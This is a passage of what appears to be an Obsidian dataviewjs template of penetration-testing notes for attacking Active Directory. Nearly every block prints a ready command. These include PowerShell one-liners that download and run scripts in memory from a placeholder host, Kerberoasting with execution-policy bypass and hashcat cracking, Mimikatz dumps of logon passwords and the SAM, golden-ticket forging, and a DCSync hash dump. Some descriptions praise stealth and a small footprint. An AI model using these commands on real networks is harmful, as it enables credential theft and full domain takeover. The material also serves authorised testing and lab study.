	cmd=`<pre><code>iex (New-Object System.Net.WebClient).DownloadString(${pg.squote}http://ip/Get-DomainGroups.ps1${pg.squote}); Get-DomainGroups -All</code></pre>`;
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading = "Domain Admins";
	let desc=`See [zinhart domain enumeration](https://github.com/zinhart/domain-enumeration.git).`;
	let cmd=`<pre><code>. .\\Get-DomainGroups.ps1; Get-DomainGroups -GroupName 'Domain Admins' -V</code></pre>`;
	dv.header(4, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
	desc=`In memory execution`;
	cmd=`<pre><code>iex (New-Object System.Net.WebClient).DownloadString(${pg.squote}http://ip/Get-DomainGroups.ps1${pg.squote}); Get-DomainGroups -GroupName ${pg.squote}Domain Admins${pg.squote} -V</code></pre>`;
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading = "Nested Domain Groups.";
	let desc=`See [zinhart domain enumeration](https://github.com/zinhart/domain-enumeration.git).`
	let cmd = `<pre><code>. .\\Resolve-NestedGroups.ps1; Resolve-NestedGroups -DN "Distinguished Name of Group"</code></pre>`;
	dv.header(3, heading);
	dv.paragraph(desc)
	dv.paragraph(cmd);
	desc=`In memory execution`;
	cmd=`<pre><code>iex (New-Object System.Net.WebClient).DownloadString('http://ip/Resolve-NestedGroups.ps1'); Resolve-NestedGroups -DN 'Group Distinguished name'</code></pre>`;
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading = "Domain Computers."
	let desc=`See [zinhart domain enumeration](https://github.com/zinhart/domain-enumeration.git).`
	let cmd = `<pre><code>. .\\Get-DomainComputers.ps1; Get-DomainComputers </code></pre>`;
	dv.header(3, heading);
	dv.paragraph(desc)
	dv.paragraph(cmd);
	desc=`In memory execution`;
	cmd=`<pre><code>iex (New-Object System.Net.WebClient).DownloadString('http://ip/Get-DomainComputers.ps1'); Get-DomainComputers</code></pre>`;
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading = "Domain Service Principal Names";
	let desc=`See [zinhart domain enumeration](https://github.com/zinhart/domain-enumeration.git).`
	let cmd = `<pre><code>. .\\Get-SPN.ps1; Get-SPN</code></pre>`;
	dv.header(3, heading);
	dv.paragraph(desc)
	dv.paragraph(cmd);
	desc=`In memory execution`;
	cmd=`<pre><code>iex (New-Object System.Net.WebClient).DownloadString('http://ip/Get-SPN.ps1'); Get-SPN</code></pre>`;
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading = "Domain Users";
	let desc=`See [zinhart domain enumeration](https://github.com/zinhart/domain-enumeration.git).`
	let cmd = `<pre><code>. .\\Get-DomainUsers.ps1; Get-DomainUsers</code></pre>`;
	dv.header(3, heading);
	dv.paragraph(desc)
	dv.paragraph(cmd);
	desc=`In memory execution`;
	cmd=`<pre><code>iex (New-Object System.Net.WebClient).DownloadString('http://ip/Get-DomainUsers.ps1'); Get-DomainUsers</code></pre>`;
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading=`Kerberoasting Service Accounts`;
	let desc=`See [zinhart kerberoasting](https://github.com/zinhart/Kerberoasting.git).`;
	let cmd=`<pre><code>powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/invoke-kerberoast.ps1'); Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-hash0.txt"</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
	desc=`We can then attempt to crack with hashcat.`;
	cmd=`<pre><code>hashcat -m 13100 kerb-hash0.txt wordlist.txt --outfile=kerb-hash0-cracked.txt</code></pre>`;
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

``` dataviewjs
let pg = dv.current()
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading=`Manually requesting a service TGS`;
	let desc=`Assuming we run the Get-SPN.ps1 script and get a services principal name, we can manually request a ticket to kerberoast(assuming the ticket is not already in memory). We can then use mimikatz to export the ticket and tgsrepcrack.py to crack the ticket hash.(We should keep in mind that the ticket is a binary file when using netcat ftp /etc.)`;
	let cmd=`<pre><code>Add-Type -AssemblyName System.IdentityModel;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SERVICE PRINCIPAL NAME HERE'</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading=`Other`;
	let cmd=``;
	dv.header(4, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading=`Domain SID`;
	let desc=`The domain SID is everything but the last 4 digits of an objects sid. For instance assuming an SID of <b><i>S-1-5-21-466546139-763938477-1796994327-1124</i></b> the domain port of the SID is <b><i>S-1-5-21-466546139-763938477-1796994327</i></b>. We use the domain SID to generate golden and silver tickets.`;
	let cmd=`<pre><code>whoami ${pg.fslash}user</pre></code>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading=`ADpeas`;
	let cmd=``;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

### Persistence
```dataviewjs
let pg = dv.current()
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading=`Mimikatz`;
	let desc=`While it${pg.squote}s easy enough upload mimikatz to a target and then run the binary, that leaves a trail. On the other hand we can run mimikatz in memory and leave a much smaller footprint(in RAM).`;
	let cmd=`<pre><code>IEX (New-Object System.Net.Webclient).DownloadString('https://ip/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading=`Kerberos Golden Tickets`;
	let desc=`One we get the hash of the krbtgt we should forge a golden ticket with mimikatz/kiwi`;
	let cmd=`<pre><code>kerberos::golden /user:administrator /domain:<domain> /sid:<domain SID> /sids:<SID's we want to use, ex workstation_admins, server_admins, domain_admins if there is a rigorous group policy in place> /groups:500,501,513,512,520,518,519,<relvant user groups here>/krbtgt:<nt hash of krbtgt> /ptt</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading=`Domain Controller synchronization(Stealthier than golden tickets)`;
	let desc=`We can dump hashes from the domain controller without even logging onto it, assuming we have compromised a domain admin account. It is a necessary pre-requisite to to compromise a domain admin account because we must issue the rogue dc sync from an account that has the minimum permissions. We use mimikatz to accomplish this, with /user:<target>`;
	let cmd=`<pre><code>lsadump::dcsync /user:administrator</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```
### Password Hashes
```dataviewjs
var pg = dv.current();
var fmt = pg.pw_table_fmt;
// current page
var datasource=`"${pg.file.folder}/${pg.file.name}"`;
dv.table(fmt, dv.pages(datasource)
.sort(b => b.pws.usr)
.map(b => [b.pws.svc, b.pws.usr,b.pws.ht,b.pws.hash])
);
```
### Loot
### Other
```dataviewjs
var pg = dv.current();
if(pg.display_reflection === 'yes')
{
	dv.header(2, "REFLECTION");
	dv.header(3, "INITIAL FOOTHOLD");
	dv.paragraph(pg.rif);
	dv.header(3, "PRIVILEGE ESCALATION");
	dv.paragraph(pg.rpe);
	dv.header(3, "THINGS I LEARNED");
	dv.paragraph(pg.til);
}
```